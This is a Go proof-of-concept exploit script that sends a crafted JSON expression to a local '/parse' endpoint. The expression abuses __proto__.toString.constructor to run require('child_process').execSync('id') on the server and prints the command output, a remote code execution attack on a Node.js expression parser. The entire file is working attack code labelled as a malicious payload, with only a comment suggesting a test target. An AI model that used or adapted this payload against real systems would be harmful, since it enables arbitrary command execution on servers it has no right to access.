package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	// Target URL (replace with your local or test target)
	targetURL := "http://localhost:8080/parse"

	// Malicious payload to execute a system command
	payload := `{"expression": "__proto__.toString.constructor('require(\"child_process\").execSync(\"id\").toString()')()"}`

	// Send HTTP POST request with the malicious payload
	resp, err := http.Post(targetURL, "application/json", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Error sending the payload:", err)
		return
	}
	defer resp.Body.Close()

	// Read and print the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	fmt.Println("Response from the server (command output):")
	fmt.Println(string(body))
}
